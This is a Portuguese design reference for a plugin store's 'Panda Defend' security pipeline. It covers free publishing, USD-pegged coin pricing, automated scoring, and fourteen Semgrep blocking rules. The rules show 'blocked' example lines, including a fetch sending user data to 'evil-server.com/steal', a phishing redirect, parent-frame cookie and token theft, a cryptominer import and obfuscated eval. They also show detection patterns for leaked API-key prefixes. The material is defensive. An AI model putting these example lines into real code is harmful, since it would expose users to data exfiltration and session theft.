> [!IMPORTANT]
> **🐼 ANTES DE QUALQUER AÇÃO:** Leia .agent/CONTEXT.md — contém estrutura, regras, nomenclatura e Panda Council.
> **Ativação:** /panda-council | **SSoT:** README_PANDA_OFICIAL.md | **Salve o que fez em Council Report.**
---
tool_context: panda/security
description: Security Pipeline & Panda Defend - Auth, DRM, Kill Switch
version: 1.1.0
updated: 2026-02-08
---

# 🛡️ PF_SECURITY_REFERENCE - Pipeline & Panda Defend

> **Versão:** 1.0 | **Atualizado:** 2026-02-06
> **Extraído de:** PF_MASTER_ARCHITECTURE.md §21

---

## 21. Pipeline de Publicação & Economia

> **Atualizado:** 2026-01-27 | **Status:** Aprovado

### 26.1. Princípio Fundamental

```text
┌─────────────────────────────────────────────────────────────────────────┐
│  "PUBLICAR É GRÁTIS. USAR CUSTA."                                       │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  CRIADOR: Paga ZERO para publicar                                      │
│  ├── CI/CD → Custeado pelo Panda (GitHub Actions free tier)           │
│  ├── Security Scan → Custeado pelo Panda                               │
│  └── Listing na Store → Grátis                                         │
│                                                                         │
│  COMPRADOR: Paga PC pelo uso                                           │
│  ├── Download/Instalação → X PC (definido pelo Dev)                   │
│  ├── Uso mensal (SaaS) → Y PC/mês                                     │
│  └── Recursos consumidos → Z PC (API calls, GPU, etc)                 │
│                                                                         │
│  MOTIVO: Barreira zero para criadores = mais plugins = mais valor     │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### 26.2. Pipeline Completo

```text
┌─────────────────────────────────────────────────────────────────────────┐
│  PIPELINE DE PUBLICAÇÃO                                                 │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1️⃣ DEV CRIA                            CUSTO: GRÁTIS                  │
│  └── Plugin/Bundle → git push → GitHub                                 │
│                                                                         │
│  2️⃣ VALIDAÇÃO AUTOMÁTICA                CUSTO: GRÁTIS                  │
│  ├── CI/CD checks (lint, build, test)                                  │
│  ├── Security scan (dependências)                                      │
│  └── Manifest validation (panda.json)                                  │
│                                                                         │
│  3️⃣ AUTO-APPROVE                        CUSTO: GRÁTIS                  │
│  └── 100% automático (Panda absorve)                                   │
│                                                                         │
│  4️⃣ PUBLICAÇÃO                          CUSTO: GRÁTIS                  │
│  ├── Panda Store listing criado                                        │
│  ├── Hooks gerados por plataforma                                      │
│  └── Analytics tracking ativado                                        │
│                                                                         │
│  5️⃣ MONETIZAÇÃO                         SPLIT: 55/22/15/5/3            │
│  ├── Split automático                                                  │
│  └── Payout mensal via PC ou fiat                                     │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### 26.3. USD-FIRST Pricing (Anti-Especulação)

```text
┌─────────────────────────────────────────────────────────────────────────┐
│  ESTRATÉGIA DE PREÇO - "USD-FIRST"                                      │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  PROBLEMA: Se PC valoriza, preços parecem caros                        │
│  SOLUÇÃO: Preço FIXO em USD, conversão para PC no momento              │
│                                                                         │
│  COMO FUNCIONA:                                                         │
│                                                                         │
│  1. Dev define PREÇO EM USD                                            │
│     └── Exemplo: Plugin X = $5.00                                      │
│                                                                         │
│  2. Sistema CONVERTE para PC no momento da compra                      │
│     └── $5.00 ÷ (PC atual) = quantidade PC                             │
│                                                                         │
│  EXEMPLOS:                                                              │
│                                                                         │
│     PC = $0.01 (hoje)    → $5 = 500 PC                                 │
│     PC = $0.05 (5x alta) → $5 = 100 PC                                 │
│     PC = $0.001 (queda)  → $5 = 5.000 PC                               │
│                                                                         │
│  RESULTADO: Comprador SEMPRE paga $5.00 em valor real                  │
│  BENEFÍCIO: Democratização protegida                                   │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

| Stakeholder      | Benefício                     |
| :--------------- | :---------------------------- |
| **Comprador**    | Preço previsível em $         |
| **Dev**          | Receita estável em valor real |
| **Hodler PC**    | Precisa menos PC se valorizar |
| **Novo usuário** | Mesmo poder de compra         |

### 26.4. Founder Dashboard Pop-Out

```text
┌─────────────────────────────────────────────────────────────────────────┐
│  FOUNDER DASHBOARD - POP-OUT WINDOW                                     │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  COMPORTAMENTO:                                                         │
│  ├── Botão no Header: 🏭 Founder → window.open()                       │
│  ├── Janela independente (pode arrastar para outro monitor)            │
│  ├── Sempre no topo (toggle alwaysOnTop)                               │
│  └── Estado persistente: posição e tamanho salvos                      │
│                                                                         │
│  SEÇÕES:                                                                │
│  ├── 📊 OVERVIEW: Users, DAU, PC Circulante, Revenue                  │
│  ├── 🏦 TREASURY: Health Score, PAXG/USDC, Runway                      │
│  ├── 📦 STORE: Plugins, Vendas, Top sellers                           │
│  ├── 🔥 REALTIME: Compras live, Erros, Alertas                        │
│  └── ⚙️ CONTROLS: Kill Switch, PAT Override, Broadcast                │
│                                                                         │
│  AUTH: Herda sessão do Panda (Ed25519 já validado)                     │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### 26.5. Decisões Econômicas (Jan 2026)

| Tópico                  | Decisão                        |
| :---------------------- | :----------------------------- |
| **Publicar plugin**     | GRÁTIS para criador            |
| **Auto-approve**        | GRÁTIS (free tier)             |
| **Preço plugins**       | USD-FIRST com conversão PC     |
| **Valorização PC**      | Não afeta preços reais         |
| **Founder Hook**        | Dashboard Pop-Out centralizado |
| **Free tier comprador** | 100 PC grátis/mês (newcomers)  |
| **Preço mínimo**        | $0.50 por plugin               |

### 26.6. Panda Defend - Sistema de Segurança

> **Inspirado em:** Google Play Protect / App Defense Alliance
> **Objetivo:** Regras mínimas automáticas para garantir segurança

#### A. Arquitetura de 3 Camadas

```text
┌─────────────────────────────────────────────────────────────────────────┐
│  🛡️ PANDA DEFEND - SISTEMA DE PROTEÇÃO                                 │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  CAMADA 1: PRÉ-PUBLICAÇÃO (Gate Automático)                            │
│  ├── 🔍 Static Analysis    → CodeQL + Semgrep                          │
│  ├── 📦 Dependency Scan    → Snyk + Dependabot                         │
│  ├── 🧪 Sandbox Test       → Execução isolada 30s                      │
│  ├── 📋 Manifest Audit     → Permissões vs código real                 │
│  └── ✅ Score mínimo: 70/100 para aprovar                              │
│                                                                         │
│  CAMADA 2: PÓS-PUBLICAÇÃO (Monitoramento Contínuo)                     │
│  ├── 📊 Behavior Analytics → Padrões de uso anormais                   │
│  ├── 🗳️ User Reports      → Sistema de denúncias (3 = review)         │
│  ├── 🔄 Re-scan Diário     → CVEs novas detectadas                     │
│  └── ⚡ Auto-Suspend       → Se score cair < 50                        │
│                                                                         │
│  CAMADA 3: FOUNDER OVERRIDE (Controle Manual)                          │
│  ├── 🔴 Kill Switch        → Remove instantâneo                        │
│  ├── 🟡 Suspend            → Pausa vendas pendente review              │
│  ├── 🟢 Force Approve      → Bypass manual (logado)                    │
│  └── 📝 Audit Trail        → Toda ação é registrada                    │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

#### B. Regras Mínimas Automáticas (Obrigatórias)

```text
┌─────────────────────────────────────────────────────────────────────────┐
│  🚨 REGRAS DE BLOQUEIO AUTOMÁTICO (Score = 0)                           │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  CRÍTICO - REJEIÇÃO IMEDIATA (detalhado abaixo)                        │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

##### 🔴 REGRA 1: eval() / Function() Dinâmico

**O que é:** Execução de código arbitrário a partir de strings
**Por que bloqueia:** Permite injeção de código malicioso (XSS, RCE)

```javascript
// ❌ BLOQUEADO - Input dinâmico
eval(userInput);
new Function(userInput)();
setTimeout(userInput, 100);
setInterval(userInput, 100);

// ✅ PERMITIDO - String literal
eval("console.log('test')"); // Literal, não dinâmico
```

```yaml
# Semgrep Rule
- id: panda-no-dynamic-eval
  pattern-either:
    - pattern: eval($VAR)
    - pattern: new Function($VAR)
    - pattern: setTimeout($VAR, ...)
    - pattern: setInterval($VAR, ...)
  message: "Execução dinâmica de código proibida"
  severity: ERROR
```

##### 🔴 REGRA 2: document.write() Inseguro

**O que é:** Escreve HTML diretamente no DOM
**Por que bloqueia:** Pode injetar scripts maliciosos, substitui página inteira

```javascript
// ❌ BLOQUEADO
document.write("<script>" + userInput + "</script>");
document.writeln(htmlFromServer);

// ✅ PERMITIDO - Use DOM APIs seguras
element.textContent = userInput; // Escapa automaticamente
element.appendChild(safeNode);
```

```yaml
- id: panda-no-document-write
  pattern-either:
    - pattern: document.write(...)
    - pattern: document.writeln(...)
  message: "document.write() proibido - use DOM APIs"
  severity: ERROR
```

##### 🔴 REGRA 3: innerHTML com Variáveis

**O que é:** Insere HTML não sanitizado no DOM
**Por que bloqueia:** Vetor principal de XSS

```javascript
// ❌ BLOQUEADO
element.innerHTML = userInput;
element.outerHTML = dataFromAPI;
element.insertAdjacentHTML("beforeend", untrusted);

// ✅ PERMITIDO
element.textContent = userInput; // Texto puro
element.innerHTML = DOMPurify.sanitize(userInput); // Sanitizado
```

```yaml
- id: panda-no-unsafe-innerhtml
  pattern-either:
    - pattern: $EL.innerHTML = $VAR
    - pattern: $EL.outerHTML = $VAR
    - pattern: $EL.insertAdjacentHTML(..., $VAR)
  message: "innerHTML inseguro - use textContent ou sanitize"
  severity: ERROR
```

##### 🔴 REGRA 4: Cross-Origin Storage Access

**O que é:** Tentar acessar storage de outros sites
**Por que bloqueia:** Viola sandbox do browser, roubo de dados

```javascript
// ❌ BLOQUEADO
window.parent.localStorage.getItem("token");
window.opener.sessionStorage.setItem("data", "x");
top.localStorage.clear();

// ✅ PERMITIDO - Apenas próprio domínio
localStorage.setItem("myKey", "myValue");
sessionStorage.getItem("mySession");
```

```yaml
- id: panda-no-cross-origin-storage
  pattern-either:
    - pattern: window.parent.localStorage.$METHOD(...)
    - pattern: window.opener.localStorage.$METHOD(...)
    - pattern: window.top.localStorage.$METHOD(...)
    - pattern: $FRAME.contentWindow.localStorage.$METHOD(...)
  message: "Acesso cross-origin a storage proibido"
  severity: ERROR
```

##### 🔴 REGRA 5: Fetch para Domínios Não Declarados

**O que é:** Requisições para servidores não listados no manifest
**Por que bloqueia:** Exfiltração de dados, C2 servers

```javascript
// ❌ BLOQUEADO (se não declarado no panda.json)
fetch("https://evil-server.com/steal?data=" + userData);
new XMLHttpRequest().open("POST", "https://tracking.com");

// ✅ PERMITIDO (declarado no panda.json)
// panda.json: { "permissions": { "network": ["api.meuapp.com"] } }
fetch("https://api.meuapp.com/data");
```

```yaml
- id: panda-undeclared-network
  pattern-either:
    - pattern: fetch($URL, ...)
    - pattern: new XMLHttpRequest()
  message: "Verifique se domínio está declarado no manifest"
  severity: WARNING
  # Validação real feita pelo Manifest Audit
```

##### 🔴 REGRA 6: Frame Busting / Clickjacking

**O que é:** Acessar janela pai ou opener
**Por que bloqueia:** Pode escapar sandbox, hijack sessão do usuário

```javascript
// ❌ BLOQUEADO
window.parent.postMessage(sensitiveData, "*");
window.opener.location = "https://phishing.com";
top.document.cookie; // Tentativa de roubo

// ✅ PERMITIDO - Comunicação segura
window.postMessage(data, "https://allowed-origin.com");
```

```yaml
- id: panda-no-frame-access
  pattern-either:
    - pattern: window.parent.$PROP
    - pattern: window.opener.$PROP
    - pattern: window.top.$PROP
    - pattern: parent.$PROP
  message: "Acesso a frames externos proibido"
  severity: ERROR
```

##### 🔴 REGRA 7: Crypto Mining (WebAssembly Suspeito)

**O que é:** Código que minera criptomoeda usando CPU/GPU do usuário
**Por que bloqueia:** Roubo de recursos, degrada performance

```javascript
// ❌ BLOQUEADO - Padrões de mineração
new WebAssembly.Module(cryptoBytes);
importScripts("coinhive.min.js");
// Hashes conhecidos: CoinHive, Crypto-Loot, JSEcoin

// ✅ PERMITIDO - WASM legítimo
WebAssembly.instantiate(imageProcessorWasm);
```

```yaml
- id: panda-no-crypto-mining
  pattern-either:
    - pattern: importScripts("...$MINER...")
    - pattern: new WebAssembly.Module($SUSPICIOUS)
  message: "Possível crypto mining detectado"
  severity: ERROR
  metadata:
    known-hashes:
      - "coinhive"
      - "crypto-loot"
      - "jsecoin"
      - "cryptonight"
```

##### 🔴 REGRA 8: Obfuscação Excessiva

**O que é:** Código intencionalmente ilegível
**Por que bloqueia:** Esconde malware, impossível auditar

```javascript
// ❌ BLOQUEADO - Entropy > 6.5
var _0x1a2b = ["\x68\x65\x6C\x6C\x6F"];
console[_0x1a2b[0]]();
eval(atob("ZXZhbCgiYWxlcnQoMSkiKQ=="));

// ✅ PERMITIDO - Código legível
const greeting = "hello";
console.log(greeting);

// ✅ PERMITIDO - Minificação normal (entropy < 6.0)
function a(b) {
  return b + 1;
}
```

```yaml
- id: panda-no-obfuscation
  pattern-either:
    - pattern: eval(atob(...))
    - pattern: eval(String.fromCharCode(...))
    - pattern: $VAR = [..."\x..."...]
  message: "Código obfuscado detectado"
  severity: ERROR
  metadata:
    entropy-threshold: 6.5
```

##### Tabela Resumo - Regras de Bloqueio

| ID      | Regra                | Detecta                      | Risco           |
| :------ | :------------------- | :--------------------------- | :-------------- |
| **R1**  | Dynamic eval         | `eval(var)`, `Function(var)` | RCE             |
| **R2**  | document.write       | `document.write(*)`          | XSS             |
| **R3**  | Unsafe innerHTML     | `el.innerHTML = var`         | XSS             |
| **R4**  | Cross-origin storage | `parent.localStorage`        | Data theft      |
| **R5**  | Undeclared fetch     | `fetch(unknown)`             | Exfiltration    |
| **R6**  | Frame access         | `window.parent.*`            | Sandbox escape  |
| **R7**  | Crypto mining        | WASM + known hashes          | Resource theft  |
| **R8**  | Obfuscation          | Entropy > 6.5                | Hidden malware  |
| **R9**  | Prototype Pollution  | `__proto__`, `constructor`   | RCE             |
| **R10** | Hardcoded Secrets    | API keys, tokens no código   | Credential leak |
| **R11** | Insecure Crypto      | `Math.random()` sensível     | Weak security   |

##### 🔴 REGRA 9: Prototype Pollution

**O que é:** Modificar protótipos de objetos nativos
**Por que bloqueia:** Permite injetar propriedades em TODOS os objetos, RCE

```javascript
// ❌ BLOQUEADO
obj.__proto__.isAdmin = true;
obj.constructor.prototype.exec = maliciousCode;
Object.prototype.polluted = "pwned";

// ✅ PERMITIDO
const safeObj = Object.create(null); // Sem prototype
Object.freeze(Object.prototype); // Proteção
```

```yaml
- id: panda-no-prototype-pollution
  pattern-either:
    - pattern: $OBJ.__proto__.$PROP = $VAL
    - pattern: $OBJ.constructor.prototype.$PROP = $VAL
    - pattern: Object.prototype.$PROP = $VAL
    - pattern: Array.prototype.$PROP = $VAL
  message: "Prototype pollution detectado"
  severity: ERROR
```

##### 🔴 REGRA 10: Hardcoded Secrets

**O que é:** Chaves de API, tokens, senhas no código-fonte
**Por que bloqueia:** Exposição de credenciais, acesso não autorizado

```javascript
// ❌ BLOQUEADO
const apiKey = "sk-proj-abc123xyz";
const password = "admin123";
const token = "ghp_xxxxxxxxxxxxxxxxxxxx";
const awsKey = "AKIA...";

// ✅ PERMITIDO
const apiKey = process.env.API_KEY;
const apiKey = Panda.Secrets.get("apiKey");
```

```yaml
- id: panda-no-hardcoded-secrets
  pattern-either:
    - pattern: $VAR = "sk-..."
    - pattern: $VAR = "ghp_..."
    - pattern: $VAR = "AKIA..."
    - pattern: $VAR = "AIza..."
    - pattern: password = "..."
    - pattern: apiKey = "..."
    - pattern: secret = "..."
  message: "Credencial hardcoded detectada"
  severity: ERROR
  metadata:
    patterns:
      - "sk-proj-" # OpenAI
      - "ghp_" # GitHub
      - "AKIA" # AWS
      - "AIza" # Google
      - "xoxb-" # Slack
      - "pk_live_" # Stripe
      - "sk_live_" # Stripe
```

##### 🔴 REGRA 11: Insecure Crypto

**O que é:** Usar `Math.random()` para segurança
**Por que bloqueia:** Math.random() é previsível, não é criptograficamente seguro

```javascript
// ❌ BLOQUEADO - Contexto sensível
const token = Math.random().toString(36);
const sessionId = "sess_" + Math.random();
const otp = Math.floor(Math.random() * 1000000);

// ✅ PERMITIDO - Crypto API
const token = crypto.randomUUID();
const bytes = crypto.getRandomValues(new Uint8Array(16));
const otp = crypto.getRandomValues(new Uint32Array(1))[0] % 1000000;
```

```yaml
- id: panda-no-insecure-random
  pattern-either:
    - pattern: $TOKEN = Math.random()...
    - pattern: $SESSION = "..." + Math.random()
    - pattern: $OTP = Math.floor(Math.random() * ...)
  message: "Use crypto.randomUUID() ou crypto.getRandomValues()"
  severity: ERROR
  metadata:
    safe-alternatives:
      - crypto.randomUUID()
      - crypto.getRandomValues()
      - Panda.Crypto.secureRandom()
```

##### 🔴 REGRA 12: IA Externa Não Autorizada (PROTEÇÃO DE RECEITA)

**O que é:** Chamadas diretas a APIs de IA (OpenAI, Anthropic, etc) sem passar pelo Panda.Brain
**Por que bloqueia:** Bypass do sistema de billing, roubo de receita do ecossistema

```javascript
// ❌ BLOQUEADO - Chamada direta (bypass billing)
fetch("https://api.openai.com/v1/chat/completions", {
  headers: { Authorization: "Bearer sk-..." },
});
fetch("https://api.anthropic.com/v1/messages", { ... });
fetch("https://generativelanguage.googleapis.com/v1/models", { ... });

// ✅ PERMITIDO - Via Panda (billing automático)
const response = await Panda.Brain.chat("Olá!", {
  model: "gemini-3-flash-preview", // Debita PC automaticamente
});

// ✅ PERMITIDO - BYOL (chave do USUÁRIO, não hardcoded)
const response = await Panda.Brain.chat("Olá!", {
  provider: "openai",
  byol: true, // Usuário configura sua key nas settings
});
```

```yaml
- id: panda-no-external-ai-bypass
  pattern-either:
    - pattern: fetch("https://api.openai.com/...", ...)
    - pattern: fetch("https://api.anthropic.com/...", ...)
    - pattern: fetch("https://generativelanguage.googleapis.com/...", ...)
    - pattern: fetch("https://api.mistral.ai/...", ...)
    - pattern: fetch("https://api.cohere.ai/...", ...)
  message: "IA externa direta proibida - use Panda.Brain.chat()"
  severity: ERROR
  metadata:
    reason: "Proteção de receita - todo uso de IA deve passar pelo billing"
    allowed-alternative: "Panda.Brain.chat() com byol: true para BYOL"
```

##### 🔴 REGRA 13: Bypass de Billing (PROTEÇÃO DE RECEITA)

**O que é:** Usar serviços pagos sem debitar Panda Coins
**Por que bloqueia:** Consome recursos sem pagar, quebra modelo econômico

```javascript
// ❌ BLOQUEADO - Serviço pago sem billing
await cloudService.runGPU(data); // Sem Panda.Wallet.charge()
await externalAPI.process(image); // Custo não contabilizado

// ✅ PERMITIDO - Com billing
await Panda.Wallet.charge(50, "gpu_processing"); // Debita 50 PC
await Panda.GPU.process(data); // Billing embutido

// ✅ PERMITIDO - Serviços grátis
await Panda.Storage.save(data); // Grátis
await Panda.Brain.chat("Oi", { model: "gemini-3-flash-preview" }); // Free tier
```

```yaml
- id: panda-billing-enforcement
  pattern-either:
    - pattern: $GPU.process(...) # Sem Panda.GPU wrapper
    - pattern: $AI.generate(...) # Sem Panda.Brain wrapper
  message: "Serviço pago deve usar wrapper Panda com billing"
  severity: WARNING
  metadata:
    enforcement: "Behavior monitor detecta uso real vs billing"
```

##### 🔴 REGRA 14: MCP Manifest Obrigatório

**O que é:** Todo plugin DEVE ter arquivo `panda.mcp.json`
**Por que bloqueia:** Sem MCP, IA não entende o plugin = não integra no ecossistema

```text
❌ BLOQUEADO (Não publica na Store):
my-plugin/
├── main.js
└── README.md          # Sem panda.mcp.json!

✅ PERMITIDO:
my-plugin/
├── panda.mcp.json     # OBRIGATÓRIO
├── main.js
└── README.md
```

```yaml
- id: panda-mcp-required
  pattern: "file-exists: panda.mcp.json"
  message: "Plugin DEVE ter panda.mcp.json"
  severity: ERROR
  metadata:
    spec: "PF_MCP_MANIFEST_SPEC.md"
    reason: "MCP é o diferencial do Panda - integração plug-and-play"
```

##### Cobertura Final: 14 Regras = ~97%

| Categoria            |   Regras   | Cobertura |
| :------------------- | :--------: | :-------: |
| **XSS/Injeção**      | R1, R2, R3 |    95%    |
| **Exfiltração**      | R4, R5, R6 |    90%    |
| **Cryptojacking**    |     R7     |    85%    |
| **Malware**          |     R8     |    75%    |
| **RCE**              |   R1, R9   |    90%    |
| **Credentials**      |  R10, R11  |    90%    |
| **Proteção Receita** |  R12, R13  |    95%    |
| **Integração MCP**   |    R14     |   100%    |

┌─────────────────────────────────────────────────────────────────────────┐
│ ⚠️ REGRAS DE ALERTA (Score -10 cada) │
├─────────────────────────────────────────────────────────────────────────┤
│ │
│ MÉDIO - PRECISA DECLARAR NO MANIFEST: │
│ ├── fetch() para URLs externas │
│ ├── navigator.clipboard (read/write) │
│ ├── navigator.geolocation │
│ ├── Notification API │
│ ├── WebRTC / getUserMedia │
│ ├── IndexedDB com > 50MB storage │
│ └── Web Workers / SharedWorkers │
│ │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│ ✅ BOAS PRÁTICAS (Score +5 cada) │
├─────────────────────────────────────────────────────────────────────────┤
│ │
│ BONUS - AUMENTA SCORE: │
│ ├── Content Security Policy declarado │
│ ├── Subresource Integrity (SRI) em scripts externos │
│ ├── Strict mode ("use strict") │
│ ├── TypeScript ou JSDoc completo │
│ ├── Testes unitários inclusos (> 50% coverage) │
│ ├── README.md com documentação │
│ └── Changelog / versioning semântico │
│ │
└─────────────────────────────────────────────────────────────────────────┘

````

#### C. Ferramentas Integradas (Todas Gratuitas)

| Ferramenta          | Função           | Tier | Integração     |
| :------------------ | :--------------- | :--: | :------------- |
| **CodeQL**          | Static Analysis  | Free | GitHub Actions |
| **Semgrep**         | Pattern Matching | Free | Regras custom  |
| **Snyk**            | Dependency Scan  | Free | npm/cargo      |
| **Dependabot**      | Auto-fix PRs     | Free | GitHub nativo  |
| **Trivy**           | Container Scan   | Free | Docker/WASM    |
| **ESLint Security** | JS patterns      | Free | npm            |

#### D. Manifest Obrigatório (panda.json)

```json
{
  "name": "meu-plugin",
  "version": "1.0.0",
  "author": "dev@email.com",
  "license": "MIT",

  "permissions": {
    "network": ["api.exemplo.com", "cdn.exemplo.com"],
    "storage": "10MB",
    "clipboard": false,
    "geolocation": false,
    "notifications": false
  },

  "security": {
    "csp": "default-src 'self'; script-src 'self'",
    "sri": true
  },

  "pricing": {
    "model": "one-time",
    "usd": 5.0
  }
}
```

#### E. Dashboard Panda Defend (Founder)

```text
┌─────────────────────────────────────────────────────────────────────────┐
│  🛡️ PANDA DEFEND - FOUNDER DASHBOARD                                   │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  📊 MÉTRICAS HOJE                                                      │
│  ├── Submissions: 15                                                   │
│  ├── Aprovados: 12 (80%)                                               │
│  ├── Rejeitados: 2 (13%)                                               │
│  └── Pendentes: 1 (7%)                                                 │
│                                                                         │
│  🚨 ALERTAS ATIVOS                                                     │
│  ├── [CRITICAL] plugin-xyz: eval() detectado - BLOQUEADO              │
│  ├── [WARNING] plugin-abc: fetch() não declarado - PENDENTE           │
│  └── [INFO] plugin-123: Score 85/100 - APROVADO                       │
│                                                                         │
│  📋 AÇÕES RÁPIDAS                                                      │
│  ├── [🔴 KILL ALL]    → Emergência: remove tudo pendente              │
│  ├── [🟡 PAUSE QUEUE] → Para submissions temporariamente              │
│  ├── [📝 ADD RULE]    → Nova regra Semgrep                            │
│  └── [📊 EXPORT]      → CSV com histórico                             │
│                                                                         │
│  🔍 BUSCA                                                              │
│  └── [_______________] Buscar por nome, autor, CVE                    │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

#### F. Fluxo de Aprovação

```text
┌─────────────────────────────────────────────────────────────────────────┐
│  FLUXO: git push → Store                                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1. DEV: git push                                                      │
│     │                                                                   │
│  2. GITHUB ACTIONS                                                     │
│     ├── CodeQL scan ────────┐                                          │
│     ├── Semgrep rules ──────┼──► SCORE                                │
│     ├── Snyk deps ──────────┤    CALCULADO                             │
│     └── Manifest check ─────┘                                          │
│     │                                                                   │
│  3. DECISÃO AUTOMÁTICA                                                 │
│     ├── Score ≥ 70 → ✅ AUTO-APPROVE                                  │
│     ├── Score 50-69 → 🟡 MANUAL REVIEW (Founder notificado)           │
│     └── Score < 50 → 🔴 AUTO-REJECT                                   │
│     │                                                                   │
│  4. PUBLICAÇÃO (se aprovado)                                           │
│     ├── Listing na Store                                               │
│     ├── Hooks gerados                                                  │
│     └── Monitoramento ativado                                          │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

#### G. Decisões de Segurança (Jan 2026)

| Regra                         | Valor       |
| :---------------------------- | :---------- |
| **Score mínimo auto-approve** | 70/100      |
| **Score para manual review**  | 50-69       |
| **Score para auto-reject**    | < 50        |
| **Reports para review**       | 3 denúncias |
| **Re-scan frequência**        | Diário      |
| **Sandbox timeout**           | 30 segundos |
| **Max storage permitido**     | 100MB       |

---

## H. Audit Trail & Transaction Safety (P0)

> **Fonte:** Research Ranking 2026-02-06 | **Prioridade:** P0 (Crítico)

### H.1 Imutabilidade de Transações

Toda transação econômica é registrada como evento imutável:

```javascript
// Estrutura de um Transaction Event
{
  eventId: "TRX-1707234567890-abc123",
  timestamp: "2026-02-06T15:30:00Z",
  type: "economy.transfer",
  actor: "user-123",
  payload: {
    from: "user-123",
    to: "user-456",
    amount: 100,
    reason: "plugin_purchase"
  },
  signature: "ed25519:...", // Se Founder
  idempotencyKey: "TRX-user123-1707234567890-xyz"
}
```

### H.2 Proteção contra Double-Spend

```text
┌─────────────────────────────────────────────────────────────────────────┐
│                    DOUBLE-SPEND PROTECTION                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. CHECK IDEMPOTENCY                                                   │
│     └── Key já existe? → Retorna resultado anterior                     │
│                                                                          │
│  2. LOCK WALLET                                                         │
│     └── Firebase RTDB transaction lock                                  │
│                                                                          │
│  3. VALIDATE BALANCE                                                    │
│     └── Saldo >= amount? → Continua                                     │
│                                                                          │
│  4. EXECUTE ATOMICALLY                                                  │
│     └── Debit + Credit na mesma transaction                            │
│                                                                          │
│  5. LOG EVENT                                                           │
│     └── Append-only event log                                           │
│                                                                          │
│  6. RELEASE LOCK                                                        │
│     └── Unlock wallet                                                   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### H.3 Audit Queries

```javascript
// Buscar todas as transações de um usuário
const history = await Panda.Audit.query({
  actor: 'user-123',
  types: ['economy.*'],
  since: '2026-01-01',
  limit: 100
});

// Verificar integridade de uma transação
const isValid = await Panda.Audit.verify('TRX-1707234567890-abc123');
// Compara hash com event log

// Reconstruir saldo (para debug/reconciliação)
const reconstructed = await Panda.Audit.reconstruct('user-123');
// Soma todos os eventos economy.* do usuário
```

### H.4 Retenção de Logs

| Tipo | Retenção | Storage |
|------|----------|---------|
| Transações PC | Permanente | Firebase RTDB |
| Auth events | 90 dias | Sheets Archive |
| API calls | 30 dias | BigQuery (se habilitado) |
| Errors | 7 dias | Console + Sheets |

---

> 📖 **Versão:** 1.1.0 | **Consolidado:** Security + Panda Defend + Audit Trail

````
